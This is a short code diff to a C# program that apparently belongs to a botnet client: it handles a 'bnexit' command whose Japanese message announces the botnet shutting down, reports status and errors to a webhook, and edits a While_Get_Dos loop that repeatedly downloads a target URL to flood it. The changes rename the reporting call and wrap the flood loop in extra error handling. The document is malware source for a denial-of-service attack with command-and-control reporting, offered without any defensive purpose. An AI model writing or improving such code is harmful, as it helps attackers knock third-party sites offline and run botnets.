@@ -53,10 +53,6 @@ namespace s1l14lx3
                 {
                     continue;
                 }
-                if (data.Roop == false)
-                {
-                    BeforeCMD = GetCommand;
-                }
                 Console.WriteLine(Command[0]);
                 switch (Command[0])
                 {
@@ -72,7 +68,7 @@ namespace s1l14lx3
                         break;
                     //Exit
                     case "bnexit":
-                        await S1l14lx3_Module.DATA_POST($"BotNetを終了しました");
+                        await S1l14lx3_Module.WEBHOOK_POST($"BotNetを終了しました");
                         S1l14lx3.MainThread.Start();
                         S1l14lx3.RunMain = true;
                         S1l14lx3.RunSub = true;
@@ -86,19 +82,26 @@ namespace s1l14lx3
                 await Task.Delay(10);
             }
         }
-        private static void While_Get_Dos()
+        private static async void While_Get_Dos()
         {
-            while (EazyDoSRoop)
+            try
             {
-                try
+                while (EazyDoSRoop)
                 {
-                    WebClient web = new WebClient();
-                    web.DownloadData(URL);
+                    try
+                    {
+                        WebClient web = new WebClient();
+                        web.DownloadData(URL);
+                    }
+                    catch (Exception ex)
+                    {
+                        //none
+                    }
                 }
-                catch (Exception ex)
-                {
-                    //none
-                }
+            }
+            catch (Exception ex)
+            {
+                await S1l14lx3_Module.WEBHOOK_POST($"System Error\n```{ex.Message}```");
             }
         }
     }
